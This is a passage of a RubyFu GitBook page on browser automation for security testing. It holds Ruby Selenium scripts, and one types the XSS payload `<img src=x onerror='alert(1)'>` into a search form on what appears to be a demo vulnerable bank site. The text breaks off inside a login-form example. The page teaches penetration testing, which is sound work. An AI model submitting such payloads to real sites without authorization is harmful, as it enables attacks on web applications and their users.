@@ -1,0 +1,1630 @@
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+    <head>
+        
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>Browser Manipulation | RubyFu</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 2.6.2">
+        
+        
+        <meta name="HandheldFriendly" content="true"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+        <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+        
+    <link rel="stylesheet" href="../gitbook/style.css">
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-anchors/plugin.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-splitter/splitter.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-highlight/website.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-search/search.css">
+        
+    
+        
+        <link rel="stylesheet" href="../gitbook/plugins/gitbook-plugin-fontsettings/website.css">
+        
+    
+    
+        <link rel="stylesheet" href="../styles/website.css">
+    
+
+        
+    
+    
+    <link rel="next" href="../module_0x4__web_kung_fu/web_servcies_and_apis.html" />
+    
+    
+    <link rel="prev" href="../module_0x4__web_kung_fu/extending_burpsuite.html" />
+    
+
+        <script type="text/javascript" src="../styles/header.js"></script>
+    </head>
+    <body>
+        
+        
+    <div class="book"
+        data-level="4.4"
+        data-chapter-title="Browser Manipulation"
+        data-filepath="module_0x4__web_kung_fu/browser_manipulation.md"
+        data-basepath=".."
+        data-revision="Sat Jan 23 2016 22:14:52 GMT+0300 (AST)"
+        data-innerlanguage="">
+    
+
+<div class="book-summary">
+    <nav role="navigation">
+        <ul class="summary">
+            
+            
+            
+            
+
+            
+
+            
+    
+        <li class="chapter " data-level="0" data-path="index.html">
+            
+                
+                    <a href="../index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                        Module 0x0 | Introduction
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="0.1" data-path="contribution.html">
+            
+                
+                    <a href="../contribution.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.1.</b>
+                        
+                        Contribution
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="0.2" data-path="beginners.html">
+            
+                
+                    <a href="../beginners.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.2.</b>
+                        
+                        Beginners
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="0.3" data-path="required_gems.html">
+            
+                
+                    <a href="../required_gems.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>0.3.</b>
+                        
+                        Required Gems
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1" data-path="module_0x1__basic_ruby_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.</b>
+                        
+                        Module 0x1 | Basic Ruby Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1" data-path="module_0x1__basic_ruby_kung_fu/string.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/string.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.</b>
+                        
+                        String
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1.1" data-path="module_0x1__basic_ruby_kung_fu/conversion.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/conversion.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.1.</b>
+                        
+                        Conversion
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.1.2" data-path="module_0x1__basic_ruby_kung_fu/extraction.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/extraction.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.2.</b>
+                        
+                        Extraction
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="module_0x1__basic_ruby_kung_fu/array.html">
+            
+                
+                    <a href="../module_0x1__basic_ruby_kung_fu/array.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.2.</b>
+                        
+                        Array
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2" data-path="module_0x2__system_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.</b>
+                        
+                        Module 0x2 | System Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1" data-path="module_0x2__system_kung_fu/command_execution.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/command_execution.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.1.</b>
+                        
+                        Command Execution
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="module_0x2__system_kung_fu/file_manipulation.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/file_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.</b>
+                        
+                        File manipulation
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="module_0x2__system_kung_fu/parsing_html,_xml,_json.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/parsing_html,_xml,_json.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.2.1.</b>
+                        
+                        Parsing HTML, XML, JSON
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="module_0x2__system_kung_fu/cryptography.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/cryptography.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.3.</b>
+                        
+                        Cryptography
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="module_0x2__system_kung_fu/system_shell.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/system_shell.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.</b>
+                        
+                        Remote Shell
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="module_0x2__system_kung_fu/ncatrb.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/ncatrb.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.1.</b>
+                        
+                        Ncat.rb
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="module_0x2__system_kung_fu/rce_as_a_service.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/rce_as_a_service.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.4.2.</b>
+                        
+                        RCE as a Service
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="module_0x2__system_kung_fu/virustotal.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/virustotal.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>2.5.</b>
+                        
+                        VirusTotal
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3" data-path="module_0x3__network_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.</b>
+                        
+                        Module 0x3 | Network Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1" data-path="module_0x3__network_kung_fu/ruby_socket.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ruby_socket.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.1.</b>
+                        
+                        Ruby Socket
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="module_0x3__network_kung_fu/ssid_finder.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ssid_finder.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.2.</b>
+                        
+                        SSID Finder
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="module_0x3__network_kung_fu/ftp.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ftp.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.3.</b>
+                        
+                        FTP
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="module_0x3__network_kung_fu/ssh.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/ssh.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.4.</b>
+                        
+                        SSH
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="module_0x2__system_kung_fu/email.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/email.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.5.</b>
+                        
+                        Email
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.5.1" data-path="module_0x2__system_kung_fu/smtp_enumeration.html">
+            
+                
+                    <a href="../module_0x2__system_kung_fu/smtp_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.5.1.</b>
+                        
+                        SMTP Enumeration
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.6" data-path="module_0x3__network_kung_fu/network_scanning.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/network_scanning.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.6.</b>
+                        
+                        Network Scanning
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.6.1" data-path="module_0x3__network_kung_fu/nmap.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/nmap.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.6.1.</b>
+                        
+                        Nmap
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.7" data-path="module_0x3__network_kung_fu/dns.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.7.</b>
+                        
+                        DNS
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.7.1" data-path="module_0x3__network_kung_fu/dns_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.7.1.</b>
+                        
+                        DNS Enumeration
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.8" data-path="module_0x3__network_kung_fu/snmp_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/snmp_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.8.</b>
+                        
+                        SNMP Enumeration
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.9" data-path="module_0x3__network_kung_fu/tns_enumeration.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/tns_enumeration.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.9.</b>
+                        
+                        Oracle TNS Enumeration
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.10" data-path="module_0x3__network_kung_fu/packet_manipulation.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/packet_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.</b>
+                        
+                        Packet manipulation
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.10.1" data-path="module_0x3__network_kung_fu/arp_spoofing.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/arp_spoofing.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.1.</b>
+                        
+                        ARP Spoofing
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="3.10.2" data-path="module_0x3__network_kung_fu/dns_spoofing.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/dns_spoofing.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>3.10.2.</b>
+                        
+                        DNS Spoofing
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4" data-path="module_0x4__web_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.</b>
+                        
+                        Module 0x4 | Web Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1" data-path="module_0x4__web_kung_fu/sql_injection_scanner.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/sql_injection_scanner.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.1.</b>
+                        
+                        SQL Injection Scanner
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="module_0x4__web_kung_fu/databases.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/databases.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.2.</b>
+                        
+                        Databases
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="module_0x4__web_kung_fu/extending_burpsuite.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/extending_burpsuite.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.3.</b>
+                        
+                        Extending Burp Suite
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter active" data-level="4.4" data-path="module_0x4__web_kung_fu/browser_manipulation.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/browser_manipulation.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.4.</b>
+                        
+                        Browser Manipulation
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5" data-path="module_0x4__web_kung_fu/web_servcies_and_apis.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_servcies_and_apis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.</b>
+                        
+                        Web Services and APIs
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.5.1" data-path="module_0x4__web_kung_fu/web_services.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_services.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.1.</b>
+                        
+                        Interacting with Web Services
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5.2" data-path="module_0x4__web_kung_fu/interacting_with_apis.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/interacting_with_apis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.</b>
+                        
+                        Interacting with APIs
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.5.2.1" data-path="module_0x4__web_kung_fu/wordpress_api.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/wordpress_api.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.1.</b>
+                        
+                        WordPress API
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.5.2.2" data-path="module_0x4__web_kung_fu/twitter_api.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/twitter_api.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.5.2.2.</b>
+                        
+                        Twitter API
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.6" data-path="module_0x4__web_kung_fu/ruby2javascript.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/ruby2javascript.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.6.</b>
+                        
+                        Ruby 2 JavaScript
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="4.7" data-path="module_0x4__web_kung_fu/web_server_and_proxy.html">
+            
+                
+                    <a href="../module_0x4__web_kung_fu/web_server_and_proxy.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>4.7.</b>
+                        
+                        Web Server and Proxy
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5" data-path="module_0x5__exploitation_kung_fu/index.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.</b>
+                        
+                        Module 0x5 | Exploitation Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.1" data-path="module_0x5__exploitation_kung_fu/fuzzer.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/fuzzer.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.1.</b>
+                        
+                        Fuzzer
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" data-path="module_0x5__exploitation_kung_fu/metasploit.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/metasploit.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.</b>
+                        
+                        Metasploit
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.2.1" data-path="module_0x5__exploitation_kung_fu/auxiliary_module.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/auxiliary_module.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.1.</b>
+                        
+                        Auxiliary module
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.2" data-path="module_0x5__exploitation_kung_fu/exploit_module.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/exploit_module.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.2.</b>
+                        
+                        Exploit module
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3" data-path="module_0x5__exploitation_kung_fu/meterpreter.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/meterpreter.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.</b>
+                        
+                        Meterpreter
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.2.3.1" data-path="module_0x5__exploitation_kung_fu/extensions.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/extensions.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.1.</b>
+                        
+                        API and Extensions
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3.2" data-path="module_0x5__exploitation_kung_fu/meterpreter_scripting.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/meterpreter_scripting.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.2.</b>
+                        
+                        Meterpreter Scripting
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.3.3" data-path="module_0x5__exploitation_kung_fu/railgun_api_extension.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/railgun_api_extension.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.2.3.3.</b>
+                        
+                        Railgun API Extension
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5.3" data-path="module_0x5__exploitation_kung_fu/metasm.html">
+            
+                
+                    <a href="../module_0x5__exploitation_kung_fu/metasm.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>5.3.</b>
+                        
+                        metasm
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="6" data-path="module_0x6__forensic/index.html">
+            
+                
+                    <a href="../module_0x6__forensic/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.</b>
+                        
+                        Module 0x6 | Forensic Kung Fu
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1" data-path="module_0x6__forensic/windows_forensic.html">
+            
+                
+                    <a href="../module_0x6__forensic/windows_forensic.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.1.</b>
+                        
+                        Windows Forensic
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="module_0x6__forensic/android_forensic.html">
+            
+                
+                    <a href="../module_0x6__forensic/android_forensic.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.2.</b>
+                        
+                        Android Forensic
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.3" data-path="module_0x3__network_kung_fu/network_traffic_analysis.html">
+            
+                
+                    <a href="../module_0x3__network_kung_fu/network_traffic_analysis.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.3.</b>
+                        
+                        Network Traffic Analysis
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="6.4" data-path="module_0x6__forensic/parsing_log_files.html">
+            
+                
+                    <a href="../module_0x6__forensic/parsing_log_files.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>6.4.</b>
+                        
+                        Parsing Log Files
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="7" data-path="references/index.html">
+            
+                
+                    <a href="../references/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>7.</b>
+                        
+                        References
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="8" data-path="faqs/index.html">
+            
+                
+                    <a href="../faqs/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>8.</b>
+                        
+                        FAQs
+                    </a>
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="9" data-path="contributors/index.html">
+            
+                
+                    <a href="../contributors/index.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.</b>
+                        
+                        Contributors
+                    </a>
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.1" data-path="contributors/todo.html">
+            
+                
+                    <a href="../contributors/todo.html">
+                
+                        <i class="fa fa-check"></i>
+                        
+                            <b>9.1.</b>
+                        
+                        TODO
+                    </a>
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+
+            
+            <li class="divider"></li>
+            <li>
+                <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+                    Published with GitBook
+                </a>
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="book-header" role="navigation">
+    <!-- Actions Left -->
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../" >RubyFu</a>
+    </h1>
+</div>
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                
+                
+                    <section class="normal" id="section-">
+                    
+                        <h1 id="browser-manipulation"><a name="browser-manipulation" class="plugin-anchor" href="#browser-manipulation"><span class="fa fa-link"></span></a>Browser Manipulation</h1>
+<p>As a hacker, sometimes you need to automate your client side tests (ex. XSS) and reduce the false positives that happen specially in XSS tests. The traditional automation depends on finding the sent payload been received in the response, but it doesn&apos;t mean the vulnerability get really exploited so you have to do it manually again and again.</p>
+<p>Here we&apos;ll learn how to make ruby controls our browser in order to <strong>emulate</strong> the same attacks from browser and get the real results.</p>
+<p>The most known APIs for this task are <strong><em>Selenium</em></strong> and <strong><em>Watir</em></strong> which support most know web browsers currently exist.</p>
+<h2 id="selenium-webdriver"><a name="selenium-webdriver" class="plugin-anchor" href="#selenium-webdriver"><span class="fa fa-link"></span></a>Selenium Webdriver</h2>
+<p><a href="https://github.com/seleniumhq/selenium" target="_blank"><strong>Selenium</strong></a> is an umbrella project encapsulating a variety of tools and libraries enabling web browser automation.</p>
+<ul>
+<li>To install selenium gem<pre><code>gem install selenium-webdriver
+</code></pre></li>
+</ul>
+<h3 id="get-request"><a name="get-request" class="plugin-anchor" href="#get-request"><span class="fa fa-link"></span></a>GET Request</h3>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&quot;selenium-webdriver&quot;</span>
+
+<span class="hljs-comment"># Profile Setup and Tweak </span>
+proxy = <span class="hljs-constant">Selenium::WebDriver::Proxy</span>.new(
+  <span class="hljs-symbol">:http</span>     =&gt; <span class="hljs-constant">PROXY</span>,
+  <span class="hljs-symbol">:ftp</span>      =&gt; <span class="hljs-constant">PROXY</span>,
+  <span class="hljs-symbol">:ssl</span>      =&gt; <span class="hljs-constant">PROXY</span>
+)       <span class="hljs-comment"># Set Proxy hostname and port </span>
+profile = <span class="hljs-constant">Selenium::WebDriver::Firefox::Profile</span>.from_name <span class="hljs-string">&quot;default&quot;</span>     <span class="hljs-comment"># Use an existing profile name </span>
+profile[<span class="hljs-string">&apos;general.useragent.override&apos;</span>] = <span class="hljs-string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; &quot;</span> + 
+                                        <span class="hljs-string">&quot;Windows Phone OS 7.5; Trident/5.0; &quot;</span> + 
+                                        <span class="hljs-string">&quot;IEMobile/9.0)&quot;</span>                 <span class="hljs-comment"># Set User Agent</span>
+profile.proxy = proxy                                                   <span class="hljs-comment"># Set Proxy</span>
+profile.assume_untrusted_certificate_issuer = <span class="hljs-keyword">false</span>                     <span class="hljs-comment"># Accept untrusted SSL certificates </span>
+
+<span class="hljs-comment"># Start Driver </span>
+driver = <span class="hljs-constant">Selenium::WebDriver</span>.<span class="hljs-keyword">for</span>(<span class="hljs-symbol">:firefox</span>, <span class="hljs-symbol">:profile</span> =&gt; profile)         <span class="hljs-comment"># Start firefox driver with specified profile</span>
+<span class="hljs-comment"># driver = Selenium::WebDriver.for(:firefox, :profile =&gt; &quot;default&quot;)     # Use this line if just need a current profile and no need to setup or tweak your profile</span>
+driver.manage.window.resize_to(<span class="hljs-number">500</span>, <span class="hljs-number">400</span>)                                <span class="hljs-comment"># Set Browser windows size</span>
+driver.navigate.to <span class="hljs-string">&quot;http://www.altoromutual.com/search.aspx?&quot;</span>           <span class="hljs-comment"># The URL to navigate </span>
+
+<span class="hljs-comment"># Interact with elements</span>
+element = driver.find_element(<span class="hljs-symbol">:name</span>, <span class="hljs-string">&apos;txtSearch&apos;</span>)   <span class="hljs-comment"># Find an element named &apos;txtSearch&apos;</span>
+element.send_keys <span class="hljs-string">&quot;&lt;img src=x onerror=&apos;alert(1)&apos;&gt;&quot;</span>  <span class="hljs-comment"># Send your keys to element</span>
+element.send_keys(<span class="hljs-symbol">:control</span>, <span class="hljs-string">&apos;t&apos;</span>)                    <span class="hljs-comment"># Open a new tab</span>
+element.submit                                      <span class="hljs-comment"># Submit the text you&apos;ve just sent</span>
+</code></pre>
+<blockquote>
+<p>Note that the actual keys to send depend on your OS, for example, Mac uses <code>COMMAND + t</code>, instead of <code>CONTROL + t</code>.</p>
+</blockquote>
+<h3 id="post-request"><a name="post-request" class="plugin-anchor" href="#post-request"><span class="fa fa-link"></span></a>POST Request</h3>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;selenium-webdriver&apos;</span>
+
+browser = <span class="hljs-constant">Selenium::WebDriver</span>.<span class="hljs-keyword">for</span> <span class="hljs-symbol">:firefox</span>
+browser.get <span class="hljs-string">&quot;http://www.altoromutual.com/bank/login.aspx&quot;</span>
+
+wait = <span class="hljs-constant">Selenium::WebDriver::Wait</span>.new(<span class="hljs-symbol">:timeout</span> =&gt; <span class="hljs-number">15</span>)        <span class="hljs-comment"># Set waiting timeout</span>
+<span class="hljs-comment"># Find the input elements to interact with later.</span>
+input = wait.<span class="hljs-keyword">until</span> {
+  element_user = browser.find_element(<span class="hljs-symbol">:name</span>, <span class="hljs-string">&quot;uid&quot;</span>)
+  element_pass = browser.find_element(<span class="hljs-symbol">:name</span>, <span class="hljs-string">&quot;passw&quot;</span>)
+  <span class="hljs-comment"># Retrun array of elements when get displayed</span>
+  [element_user, element_pass] <span class="hljs-keyword">if</span> element_user.displayed? <span class="hljs-keyword">and</span> element_pass.displayed?
+}
+
